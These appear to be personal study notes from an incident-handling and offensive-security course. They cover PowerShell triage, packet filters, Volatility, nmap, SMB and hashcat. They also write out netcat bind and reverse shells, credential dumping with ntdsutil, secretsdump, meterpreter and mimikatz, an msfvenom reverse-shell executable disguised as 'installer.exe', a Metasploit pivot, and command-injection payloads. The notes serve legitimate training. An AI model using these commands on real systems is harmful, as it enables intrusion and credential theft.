# 1

## Incident response model

### Six-Step Incident Response Process: PICERL

1. Preparation
2. Identification
3. Containment
4. Eradication
5. Recovery
6. Lessons Learned

Common problems of PICERL

- Poor security hygiene (lack of visibility and threat intelligence)
- Little scoping (if any) leads to incomplete containment
- Not fixing the vulnerabilities
- Failure to apply lessons learned

### Dynamic Approach to Incident Response: DAIR

1. Prepare
2. Detect: EOI (Event of Interest), IOA (Indicator of Attack)
3. Verify, Triage: might lead to IOC (Indicator of Compromise)
4. CICLE: Scope --> Contain --> Eradicate (Undo the attacker's actions) --> Recover (Back to normal)
5. Debrief

## Powershell

### Get services for a host, listening on ports

```
PS C:\> Get-Process | Select-Object -First 1 *                     


Name                       : AggregatorHost
Id                         : 1144
PriorityClass              : Normal
FileVersion                : 10.0.26100.3624 (WinBuild.160101.0800)
HandleCount                : 143
...
Container                  :

PS C:\> Get-CimInstance -Class Win32_Process | Select-Object -First 3 ProcessId, ProcessName, CommandLine, ParentProcessId

ProcessId ProcessName         CommandLine ParentProcessId
--------- -----------         ----------- ---------------
        0 System Idle Process                           0
        4 System                                        0
      140 Secure System                                 4

PS C:\> Get-NetTCPConnection -State Listen | Select-Object -First 3 -Property LocalAddress, LocalPort, OwningProcess 

LocalAddress LocalPort OwningProcess
------------ --------- -------------
::               49671          1128
::1              49670          7588
::               49669          7232

PS C:\> Get-NetTCPConnection | Select-Object local*,remote*,state,@{Name='Process';Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | Format-Table

LocalAddress LocalPort RemoteAddress RemotePort       State Process       
------------ --------- ------------- ----------       ----- -------
::               49671 ::                     0      Listen services
::1              49670 ::                     0      Listen jhi_service
::               49669 ::                     0      Listen spoolsv
::               49668 ::                     0      Listen svchost
::               49667 ::                     0      Listen svchost
```

### Servie Investigation

```
PS C:\> Get-CimInstance -ClassName Win32_Service

ProcessId Name                                                   StartMode State   Status ExitCode
--------- ----                                                   --------- -----   ------ --------
4784      AdobeARMservice                                        Auto      Running OK     0
0         AJRouter                                               Manual    Stopped OK     1077
0         ALG                                                    Manual    Stopped OK     1077
0         AppIDSvc                                               Manual    Stopped OK     1077

PS C:\> Get-CimInstance -ClassName Win32_Service | Select-Object -First 2 * | Format-List Name,Caption,Description,PathName

Name        : ALG
Caption     : Application Layer Gateway Service
Description : インターネット接続共有に使用する、サード パーティのプロトコル プラグイン用のサポートを提供します。PathName    : C:\WINDOWS\System32\alg.exe
```

### Registry Interogation

```
PS C:\> Get-ChildItem 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\"" | Select-Object PSChildName

PSChildName
-----------
AddressBook
...
{B95E117F-2411-41AD-A9A5-77511F3040E4}


PS C:\> Get-ItemProperty 'HKLM:Software\Microsoft\Windows\CurrentVersion\Run'


SecurityHealth              : C:\WINDOWS\system32\SecurityHealthSystray.exe
RtkAudUService              : "C:\WINDOWS\System32\DriverStore\FileRepository\realtekservice.inf_amd64_a42d9de41f05fa49\RtkAudUService64.exe" -background
egui                        : "C:\Program Files\ESET\ESET Security\ecmds.exe" /run /hide /proxy
Logitech Download Assistant : C:\Windows\system32\rundll32.exe C:\Windows\System32\LogiLDA.dll,LogiFetch
PSPath                      : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
PSParentPath                : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion
PSChildName                 : Run
PSDrive                     : HKLM
PSProvider                  : Microsoft.PowerShell.Core\Registry
```

### Unusual Accounts

```
PS C:\> Get-LocalUser | Where-Object { $_.Enabled -eq $True }

Name Enabled Description
---- ------- -----------
sqat True


PS C:\> Get-LocalGroupMember Administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
ユーザー    82202001-NP\Administrator Local
ユーザー    82202001-NP\sqat          Local


PS C:\> Get-LocalGroup | Select-Object -First 1 *


Description     : VMware User Group
Name            : __vmware__
SID             : S-1-5-21-4092567976-269810716-2760018999-1003
PrincipalSource : Local
ObjectClass     : グループ
```

### Scheduled Tasks

```
PS C:\> Get-ScheduledTask *Onedrive* | Select-Object -Property TaskName

TaskName
--------
OneDrive Reporting Task-S-1-5-21-4092567976-269810716-2760018999-1001
OneDrive Standalone Update Task-S-1-5-21-1270127141-432312421-2650139308-500
OneDrive Standalone Update Task-S-1-5-21-4092567976-269810716-2760018999-1001
OneDrive Startup Task-S-1-5-21-4092567976-269810716-2760018999-1001

PS C:\> Export-ScheduledTask -TaskName "OneDrive Reporting Task-S-1-5-21-4092567976-269810716-2760018999-1001"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <URI>\OneDrive Reporting Task-S-1-5-21-4092567976-269810716-2760018999-1001</URI>
  </RegistrationInfo>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-4092567976-269810716-2760018999-1001</UserId>
      <LogonType>InteractiveToken</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <RestartOnFailure>
      <Count>2</Count>
      <Interval>PT30M</Interval>
    </RestartOnFailure>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
  </Settings>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2025-04-16T23:03:12</StartBoundary>
      <Repetition>
        <Interval>P1D</Interval>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>%localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe</Command>
      <Arguments>/reporting</Arguments>
    </Exec>
  </Actions>
</Task>
PS C:\> Get-ScheduledTaskInfo -TaskName 'OneDrive Reporting Task-S-1-5-21-4092567976-269810716-2760018999-1001' | Select-Object LastRunTime

PS C:\> Get-ScheduledTaskInfo -TaskName 'OneDrive Reporting Task-S-1-5-21-4092567976-269810716-2760018999-1001' | Select-Object LastRunTime

LastRunTime        
-----------
2025/04/17 15:16:26
```

### Get Windows Event

```
PS C:\> $end = Get-Date 4/16/2025;
PS C:\> $start = Get-Date 4/15/2025;
PS C:\> Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=$start; EndTime=$end;}


   ProviderName: Microsoft-Windows-Eventlog

TimeCreated                      Id LevelDisplayName Message
-----------                      -- ---------------- -------
2025/04/15 16:39:50            1100 情報             イベント ログ サービスがシャットダウンしました。

   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                      Id LevelDisplayName Message
-----------                      -- ---------------- -------
2025/04/15 16:39:50            4672 情報             新しいログオンに特権が割り当てられました。...
2025/04/15 16:39:50            4624 情報             アカウントが正常にログオンしました。...
2025/04/15 16:39:49            4647 情報             ユーザー開始のログオフ:...

PS C:\> Get-WinEvent -LogName Security | Where-Object -Property Id -EQ 4625 | Format-List -Property TimeCreated,Message


TimeCreated : 2025/04/17 22:04:58
Message     : アカウントがログオンに失敗しました。
              サブジェクト:
...
```

### File hash and strings

```
PS C:\> Get-FileHash .\DumpStack.log

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          A981D2E8EBDA6A41C87CC7E5EFA9746E4D6CB99D023CF456B8FC58422BC330C1       C:\DumpStack.log

PS C:\tools\sysinternals> strings FILE_PATH
```

in bash

```
$ strings file ; strings -e l file
```

- -e: ASCII only
- l: LE unicode strings only

## Packet capturing

```
tcpdump -i INTERFACE -w FILE_PATH
tcpdump -r FILE_PATH -n -A
```

- -i: interface to capture
- -w: writeout to the path
- -n: no resolve for port and host
- -A: show as ASCII

## BPF: Berkeley packet filters

The format is

```
[protocol] [direction] [field]
```

Example is:

```
dst host 192.168.1.0
src host 192.168.1
dst host 172.16
src host 10
host 192.168.1.0
host 192.168.1.0/24
src host 192.168.1/24

ether host <MAC>
ether src host <MAC>
ether dst host <MAC>

dst net 192.168.1.0
src net 192.168.1
dst net 172.16
src net 10
net 192.168.1.0
net 192.168.1.0/24
src net 192.168.1/24RunOnlyIfNetworkAvailable

dst net 192.168.1.0 mask 255.255.255.255 or dst net 192.168.1.0/24
src net 192.168.1 mask 255.255.255.0 or src net 192.168.1/24
dst net 172.16 mask 255.255.0.0 src net 10 mask 255.0.0.0

src port 443
dst port 20
port 80

ether proto 0x888e
ip proto 50

vlan 100 && vlan 200
vlan && vlan 300 && ip

mpls 100000 && mpls 1024
mpls && mpls 1024 && host 192.9.200.1
```

could be used with `tcpdump`

| Purpose                        | Command                                                                           |
| ------------------------------ | --------------------------------------------------------------------------------- |
| All traffic on eth0            | `tcpdump -i eth0`                                                                 |
| Only TCP traffic               | `tcpdump -i eth0 tcp`                                                             |
| Capture HTTPS                  | `tcpdump -i eth0 port 443`                                                        |
| Filter by IP                   | `tcpdump -i eth0 host 192.168.1.10`                                               |
| Traffic from a specific subnet | `tcpdump -i eth0 net 192.168.1.0/24`                                              |
| Capture to file                | `tcpdump -i eth0 -w capture.pcap`                                                 |
| Read capture file              | `tcpdump -r capture.pcap`                                                         |
| DNS Queries                    | `tcpdump -i eth0 udp port 53`                                                     |
| Only SYN packets               | `tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0'` |
| ICMP (pings)                   | `tcpdump -i eth0 icmp`                                                            |


### wireshark display filter

```
[protocol].[field] [operator] [value]
```

| Purpose                       | Display Filter                                    |
| ----------------------------- | ------------------------------------------------- |
| Show all HTTP traffic         | `http`                                            |
| Traffic from a source IP      | `ip.src == 192.168.1.10`                          |
| Traffic to a destination IP   | `ip.dst == 10.0.0.5`                              |
| Show TCP SYN packets          | `tcp.flags.syn == 1 and tcp.flags.ack == 0`       |
| TCP conversations between IPs | `ip.addr == 192.168.1.10 and ip.addr == 10.0.0.5` |
| Filter by port                | `tcp.port == 443`                                 |
| Show UDP only                 | `udp`                                             |
| ICMP packets                  | `icmp`                                            |
| DNS requests                  | `dns` or `udp.port == 53`                         |
| DHCP packets                  | `bootp`                                           |
| HTTP GET requests             | `http.request.method == "GET"`                    |
| TLS Handshake                 | `ssl.handshake` or `tls.handshake.type == 1`      |
| Filter by MAC                 | `eth.addr == 00:11:22:33:44:55`                   |



## Squid access.log

```
1583050850.951 185 192.168.42.109 TCP_MISS/200 1856 POST https://google.com - ORIGINAL_DST/172.217.11.163 text/xml
-------------- --- -------------- ------------ ---- ---- ------------------ - --------------------------- --------
UTC timestamp
               Duration
                   Client who accessed the proxy
                                  Result code of Proxy/HTTP status code
                                               Size of packet
                                                    Method
                                                         URL
                                                                            User agent
                                                                              Hierarchy code (description of how the request was handled)
                                                                                                          Content type
```

## Volatility

```
$ vol -q -f win10.0.22000.556.raw windows.pslist.PsList
Volatility 3 Framework 2.0.2
PID PPID ImageFileName CreateTime
4 0 System 2022-03-28 11:10:44.000000
344 4 smss.exe 2022-03-28 11:10:44.000000
640 564 lsass.exe 2022-03-28 11:10:52.000000
5248 640 nc.exe 2022-03-28 11:31:56.000000
```


| Volatility 3 Module | Capability |
| --- | --- |
| List DLLs for processes | windows.dlllist.DllList |
| List kernel modules | windows.driverscan.DriverScan |
| List environment variables | windows.envars.Envars |
| Scan for files | windows.filescan.FileScan |
| Carve out files | windows.dumpfiles.DumpFiles |
| Examine Windows version information | windows.info.Info |
| Retrieve password hashes | windows.hashdump.Hashdump |
| List privileges by process | windows.privileges.Privs |
| List registry hive offsets | windows.registry.hivelist.HiveList |
| Access keys with --offset | windows.registry.printkey.PrintKey |
| Enumerate programs run from the Start menu | windows.registry.userassist.UserAssist |
| List trusted certificates in Windows cert. store | windows.registry.certificates.Certificates |
| List service name, display name, and PID | windows.svcscan.SvcScan |


# 2

## nmap

### Scan type flag

| Type | Flag | Description |
| --- | --- | --- |
| Ping or ARP | -sn | No port scanning, ARP if on same LAN, ping if not |
| TCP connect | -sT | TCP connection established, default for non-root priv |
| TCP SYN | -sS | Send SYN, see the response, default for root priv |
| UDP | -sU | UDP port scanning (UNRELIABLE) |
| Version | -sV | Send active probes to determine the service running on the port |

SYN scanning, when `Open`

```
A ----SYN----> B
A <--SYN,ACK-- B
```

SYN scanning, when `Closed`

```
A ----SYN----> B
A <--RST,ACK-- B
```

### Host Discovery

```
sudo nmap -sn 192.168.1.1-254
```

### Output type

| Flag | Output formt |
| --- | --- |
| -oA FILE | XML, greppable, normal |
| -oG FILE | Greppable |
| -oX FILE | XML |
| -oN FILE | Normal |

### NSE

| NSE | Function |
| --- | --- |
| -sC | Use default scripts |
| --script all | Run all scripts (DoS like) |
| --script-updatedb | Update the NSE scripts |
| --script banner | Get the banner |
| --script-help "help*" | Get help for the matching scripts |
| --script "http*" | Run the matching script |

> `nmap --script snmp-sysdescr --script-args creds.snmp=admin example.com`


## Cloud

### IP List

- GCP: `wget -qO- https://www.gstatic.com/ipranges/cloud.json | jq '.prefixes[] | .ipv4Prefix' -r`
- AWS: `wget -qO- https://ip-ranges.amazonaws.com/ip-ranges.json | jq '.prefixes[] | .ip_prefix' -r`
- Azure: `wget https://www.microsoft.com/en-us/download/details.aspx?id=56519 && jq < ~/Downloads/ServiceTags_Public_*.json '.values | .[] | .properties.addressPrefixes | .[]' -r`

### massscan

```
masscan 218.223.4.0/24 -p 22,25,80,443,3389
```

### TLS-SCAN

```
./tls-scan -c 142.250.199.110 --port=443 --pretty
```

## SMB

### Command to List

```
Get-CimInstance -Class win32_share -ComputerName 192.168.171.176 -Credentials
```

```
net.exe view \\192.168.171.176 /all
```

#### Command to Control

```
PS C:\> Get-SmbSession

SessionId ClientComputerName ClientUserName NumOpens
--------- ------------------ -------------- --------
549755813893 10.10.75.1 SEC504STUDENT\sec504 1

PS C:\> Get-SmbSession | Select-Object ClientComputerName, Dialect, SecondsExists, SecondsIdle

ClientComputerName Dialect SecondsExists SecondsIdle
------------------ ------- ------------- -----------
10.10.75.1 3.1.1 8147 84

PS C:\> $Password = Read-Host -AsSecureString
***********

PS C:\> Set-LocalUser -Name sec504 -Password $Password
PS C:\> Close-SmbSession -ClientComputerName 10.10.75.1 -Force
```

### Tools

#### SMBeagle

https://github.com/punk-security/SMBeagle

```
smbeagle -c results.csv -n 192.168.1.0/24 -u ksmith -p Password123 -q
```

#### SmbClient

```
smbclient -L //192.168.99.10 -U ksmith -m SMB2
smbclient -L \\\\192.158.99.10 -U ksmith
smbclient //192.168.99.10/accounting -U ksmith -m SMB2
```

```
[root@x:/app]# smbclient -L //10.0.1.8/ -U User
Password for [WORKGROUP\User]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
SMB1 disabled -- no workgroup available
[root@x:/app]# smbclient //10.0.1.8/Users -U User
Password for [WORKGROUP\User]:
Try "help" to get a list of possible commands.
smb: \> cd Users
cd \Users\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> ls
  .                                  DR        0  Fri Sep  6 16:12:56 2024
  ..                                DHS        0  Tue Apr 29 14:05:13 2025
  Default                           DHR        0  Fri Sep  6 16:22:57 2024
  desktop.ini                       AHS      174  Sat May  7 14:22:32 2022
  User                                D        0  Fri May 23 00:40:56 2025

                58209535 blocks of size 4096. 45611489 blocks available
smb: \> cd User
smb: \User\> cd Desktop\
smb: \User\Desktop\> ls
  .                                  DR        0  Sat Nov 30 18:04:41 2024
  ..                                  D        0  Fri May 23 00:40:56 2025
  desktop.ini                       AHS      282  Fri Sep  6 16:23:17 2024
  MarketSpeed2.lnk                    A     2365  Sat Nov 30 18:04:42 2024
  Microsoft Edge.lnk                  A     2347  Fri Sep  6 15:28:33 2024

                58209535 blocks of size 4096. 45611489 blocks available
smb: \User\Desktop\> tar c desktop.ini
tar: dumped 3 files and 0 directories
Total bytes written: 4994 (0.0 MiB/s)
smb: \User\Desktop\> exit
```


#### DeepBlue

```
PS C:\> DeepBlue.ps1
PS C:\> DeepBlue.ps1 Logfile.evtx
PS C:\> DeepBlue.ps1 -Log System
PS C:\> $credential = Get-Credential
PS C:\> DeepBlue.ps1 -Log System -Hostname DC1 -Credential $credential

PS C:\> .\DeepBlue.ps1 .\evtx\password-spray.evtx

PS C:\> .\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-security.evtx
```

### Command matrix

| Functionality | PowerShell | CMD |
| --- | --- | --- |
| View remote smb shares | `Get-WmiObject -Class win32_share ComputerName <SERVER_IP>` | `net view /all \\<SERVER_IP>` |
| View local smb shares | `Get-SMBShare` | `net share` |
| Connect SMB share | `New-SmbMapping -LocalPath X: -RemotePath \\<SERVER_IP>\<SHARE_NAME>` -UserName <USER> -Password <PASS> | `net use \\<SERVER_IP>\<SHARE_NAME>` |
| View Inbound connections | `Get-SMBSession` | `net session` |
| Drop Inbound connections | `Close-SMBSession` | `net session \\<SERVER_IP /del` |
| View Outbound SMB mapped connections | `Get-SMBMapping` | `net use` |
| Drop Outbound SMB mapped connections | `Remove-SMBMapping -Force` | `net use * /del` |

## netcat

### Connection

Server

```
netcat -l -p 8080
```

Client

```
netcat 10.0.0.1 8080
```

### Send files

#### Listener --> Client

Listener (sending to client)

```
cat file | netcat -l -p 2222
```

Client (received from server)

```
netcat 10.0.0.1 2222 > file
```

#### Client --> Server

Client (sending to listener)

```
cat file | netcat 10.0.0.1 2222
```

Listener (received from client)

```
netcat -l -p 2222 > file
```

### Port scanning

```
nc -v -w 3 (-p 80) -z <TARGET_IP> <START_PORT>-<END_PORT>
```

- `-z`: minimal data to send
- `-v`: tell us when connection is made (enables us to know the port is open or not)
- `-w 3`: no wait more than 3 seconds on EACH port
- `-p 80`: **LOCAL port** to connect to

### Backdoor

#### Normal shell listener

```
[Attakcer] --> |FW| --> [Victim]
  Client                 Listener
```

Listener (run on victim)

```
nc -l -p 8080 -e /bin/bash
```

Client (attacker)

```
nc 184.29.20.198 8080
ls
whoami
pwd
```

#### Reverse shell

```
[Attakcer] <--------- [Victim]
 Listener              Client
```

Lisntener (on attacker)

```
nc -l -p 9999 -e 
```

Client (on victim)

```
nc 38.201.128.1 9999 -e /bin/bash
```

### Relay

#### One-way: A to C

```
A 10.0.0.1 --> B 10.1.0.1 --> C 10.2.0.1
```

A

```
nc 10.1.0.1 8080
```

B

```
nc -l -p | nc 10.2.0.1 8888
```

C

```
nc -l -p 8888 -e /bin/bash
```

#### BiDirectional: A and C

```
A 10.0.0.1 <--> B 10.1.0.1 <--> C 10.2.0.1
```

A

```
nc 10.1.0.1 8080
```

B

```
mkfifo backpipe
nc -l -p 2222 < backpipe | nc 10.10.10.100 80 > backpipe
```

C

```
nc -l -p 8888 -e /bin/bash
```


# 3

## Legba

```
legba -U sec504 -P sec504 -T 10.10.75.1 ssh
 legba -U user_list.txt -P password_list.txt -T 10.10.75.1 ssh
```

## Password Cracking Techinques

1. Guessing password: Just use list (or called Dictionary Attack)
2. Password spray: Small number of attempt on each of many hosts to circumvent lockout
3. Brute force

## Hashing in Windows

- LANMAN Hashing: Case insensitive, up to 14 characters, encrypted with DES with a leaked key
- NT Hashes: Case sensitive, no limit in length, encrypted

> NTLM, NTLMv2, and Kerberos all use the NT hash. The LM authentication protocol uses the LM hash.

- For domain user hashing, it can be exported to NTDS.dit, but it is encrypted with SYSTEM hive
- For modern system, dumping hashing with meterpreter's hashdump, is not working. It must run inside lsass.exe process.

### LANMAN Hashing

**Even if LANMAN hashing enabled on the host, by its nature, password that is equal or greater than 15 characters in length, will NOT be stored as LANMAN hashing**

0. Original: `BuDdy12&`
1. Convert To Upper case: `BUDDY12&`
2. Pad to 14 (characters): `BUDDY12&______` (pad with `\x00`)
3. Split into 2 of 7: `BUDDY12` + `&______`
4. DES Encryption for each: `2C42686862534AA4` + `A86FB73C70515BD7` (64 bit key is `KGS!@#$%` (8 bits for a character, 8 characters))

### NT Hashes

Significantly stronger than LANMAN but *salt is not used*

0. Original: `BuDdy12&`
1. Convert it into unicode: `B\x00u\x00D\x00d\x00y\x001\x002\x00&\x00`
2. Unicode to MD4 hash: `17a7afd733dda50143b242a2aad8f0f7`
3. Encrypt the hash with EC4 or AES-CBC-128 and store it in the SAM registry

### Get Domain Controller Hashes

By use of Directory domain services management utility `ntdsutil`, `NTDS.dit` can be gathered.

```
C:\Users\Administrator> ntdsutil
ntdsutil: activate instance ntds
Active instance set to "ntds".
ntdsutil: ifm
ifm: create full c:\ntds
...
Copying registry files...
Copying c:\ntds\registry\SYSTEM
Copying c:\ntds\registry\SECURITY
IFM media created successfully in c:\ntds
ifm: quit
ntdsutil: quit
```

NTDS.dit is the file that contains hashes but it is encrypted with SYSTEM hive. So make use of SYSTEM hive, decrypt the file and store hashes in plain text: [secretsdump.py](https://github.com/fortra/impacket)

```
$  secretsdump.py -system registry/SYSTEM -ntds Active\
Directory/ntds.dit LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Target system bootKey: 0x3b53edaa727f0bbbc56bed5beb9a9530
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 05b651dcf420b842402b9d3cf3508e6a
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c3db44d312f154d162607
ee52628ace3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:2a9fa667f0d1b99b758767e68ea4e
c52:::
...
```

#### Get Windows 10 Password Hashes: Use meterpreter

1. Spawn an initial process
2. Migrate the process into ones inside of lsass.exe
3. Dump hashes

```
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > ps -S lsass.exe
Process List
============
PID PPID Name Arch Session User Path
--- ---- ---- ---- ------- ---- ----
620 480 lsass.exe x64 0 NT AUTHORITY\SYSTEM
C:\Win...\System32\lsass.exe
meterpreter > migrate 620
[*] Migrating from 1248 to 620...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089
c0:::
susan:1000:aad3b435b51404eeaad3b435b51404ee:864d8a2947723c4264598997c1d67a83:::
Reads password hashes
```

or shorter version is:

```
meterpreter > migrate -N lsass.exe
```

#### Get Windows 10 Password Hashes: Use Mimikatz

Get SAM and SYSTEM

```
C:\Temp> reg save hklm\sam sam.hiv && reg save hklm\system system.hiv
C:\Temp> c:\tools\mimikatz\x64\mimikatz.exe "lsadump::sam /sam:sam.hiv
/system:system.hiv" "exit"
...
RID : 000003e8 (1000)
User : Sec504
Hash NTLM: 864d8a2947723c4264598997c1d67a83
```

#### Analyze Windows hash output from tools

```
<USERNAME>:<USERID>:<LANMAN>:<NTHASH>
```

```
bob:1001:2c42686862534aa4a86fb73c70515bd7:17a7afd733dda50143b242a2aad8f0f7::
tom:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::
```

- Empty LANMAN: `aad3b435b51404eeaad3b435b51404ee`
- Empty NTHASH: `31d6cfe0d16ae931b73c59d7e0c089c0`


> Am All Day Baffled (`aad3b`) By Difficult Choices For Encrypted Data (`31d6cfe0d`)


## Hashing in linux

- `/etc/passwd`: user names
- `/etc/shadow`: password hashes

```
<USERNAME>:$<HASHTYPE>$<SALT>$<ENCODED_HASH>
sec580:$1$5XEtFMh0$5t7Dwuf4pBFEbvtGCkQn90:17315:0:99999:7:::
```

| Indicator | Hash type |
| --- | --- |
| missing | DES |
| $1 | MD5 |
| $5 | SHA256 |
| $6 | SHA512 |
| $y | Yescrypt |


## Hashcat

### Mode and example

| Mode | Flag | Description |
| --- | --- | --- |
| Straight | -a 0 | Use dictionary file |
| Combinator | -a 1 | Generate candidate two words from two files |
| Brute-force | -a 3 | Normal brute-force |
| Hybrid: Wordlist + Mask | -a 6 | Append mask to each of wordlist |
| Hybrid: Mask + Wordlist | -a 7 | Prepend mask t oeach of wordlist |

```
hashcat -m 0 -a 0 a95c530a7af5f492a74499e70578d150 <WORDLIST_FILE>
hashcat -m 0 -a 0 hashlist.txt <WORDLIST_FILE>
hashcat -m 0 -a 1 hashlist.txt <WORDLIST_FILE_1> <WORDLIST_FILE_2>
hashcat -m 0 -a 3 a95c530a7af5f492a74499e70578d150 ?d?l?l?d
hashcat -m 0 -a 3 a95c530a7af5f492a74499e70578d150 -1  ?1?1?1?1
hashcat -m 0 -a 3 a95c530a7af5f492a74499e70578d150 -1 abcdefghijklmnopqrstuvwxyz -2 0123456789 ?1?1?2?2
hashcat -m 0 -a 3 a95c530a7af5f492a74499e70578d150 -1 ?l -2 ?d ?1?1?2?2
hashcat -m 0 -a 6 a95c530a7af5f492a74499e70578d150 <WORDLIST_FILE> ?d?d
hashcat -m 0 -a 7 a95c530a7af5f492a74499e70578d150 ?d?d <WORDLIST_FILE>
```

#### Get the hashtype for `-m`

```
hashcat --identify hashes.txt
```

#### Mask

| Marker | Char sequence |
| --- | --- |
| ?l | abcdefghijklmnopqrstuvwxyz |
| ?u | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| ?d | 0123456789 |
| ?s | <SPACE>!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~ |
| ?a | ?l?u?s?d |

#### Show cracked password history

Get a list of cracked hashes from a given file using potfile

```
$ hashcat -m 0 hash_list.txt --show
861f194e9d6118f3d942a72be3e51749:1234test   <-- Cracked
$ hashcat -m 0 hash_list.txt --left
60b725f10c9c85c70d97880dfe8191b3            <-- Uncracked
```

## Metasploit

- Exploit: taking advantage of known flaw
- Payload: The code attackers want to run
  - Bind shell to arbitrary port
  - Reverse shell
  - Windows VNC server (as a DLL, injected into a vuln process)
  - Create local admin user
  - Meterpreter (run inside a vuln process, completetly on memory, transported with TLS): for Windows
  - Msfvenom: Standalone payload
- Auxiliary: Scanning
- Post modules: priv esc, gather creds, ...


```
On attacker
sec504@slingshot:~$ msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform windows LHOST=172.16.0.6 LPORT=4444 -o installer.exe
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: installer.exe
sec504@slingshot:~$ file installer.exe
installer.exe: PE32 executable (GUI) Intel 80386, for MS Windows
sec504@slingshot:~$
sec504@slingshot:~$
sec504@slingshot:~$ msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LPORT 4444; set LHOST 0.0.0.0; exploit"
[*] Starting persistent handler(s)...
```

the other example is

```
# Step 1: Background the current session
msf6 > background
[*] Backgrounding session 1...

# Step 2: Add route through the session to reach internal LAN
msf6 > route add 192.168.56.0 255.255.255.0 1
[*] Route added

# Step 3: Use post/multi/manage/autoroute (optional check)
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > run
[*] Route added to subnet 192.168.56.0/24 via session 1

# Step 4: Scan the internal LAN via the session
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.56.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,80,135,139,445
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 10
msf6 auxiliary(scanner/portscan/tcp) > run
[*] Scanning 192.168.56.0/24...
[+] 192.168.56.105:445 - TCP OPEN
[+] 192.168.56.102:80 - TCP OPEN

# Step 5: Attack a discovered host (e.g. with MS08-067 exploit)
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.56.105
msf6 exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.56.1
msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 4445
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Exploit completed, launching session...
[*] Meterpreter session 2 opened

# Step 6: Interact with new session
msf6 > sessions -i 2
[*] Starting interaction with session 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

## Web attacks

- drive-by attack: Attacker compromises a weak and legitimate website, users will access the website, and js will be kicked and important data is sent to attacker's server
- waterhole attack: the victims are targeted in drive-by attacks
- beef

# 4

## Web Application Attack

### Discover contents

- Forced browsing: To access, use predefined list of URI rather than follow links
- Insecure Direct Object Reference (IDOR): Predictable pattern in URI
- `robots.txt`: Cue to discover hidden directories
- ffuf: pretty fast enumeration tool

```
ffuf -w words.txt -u https://target.tgt/FUZZ
```

```
python dates.py | ffuf -w - -u https://target.tld/ticketsbyday?id=FUZZ
seq -w 0 999 | ffuf -w - -u https://example.com/FUZZ
```

### Command injections

| payload | description |
| --- | --- |
| -h | maybe help will apppear |
| PARAM; echo 1 | Unix only |
| echo 1\| | perl specific, when opening a file |
| PARAM \| echo 1 | run echo after initial command |
| PARAM \|\| echo 1 | Unix only, initial command returns non-zero, run echo |
| PARAM & echo 1 | Unix only, run inital command as a background task, and echo |
| PARAM && echo 1 | Unix only, initial command returns zero, run echo |
| $(echo 1) | Unix only, bash specific |
| \`echo 1\` | Unix only, generic process substitution |
| >(echo 1) | Unix only, run echo using substitution |

### XSS

- Type of XSS:
  - Stored: Attacker store script into the website, and victim visit the page and execute the script
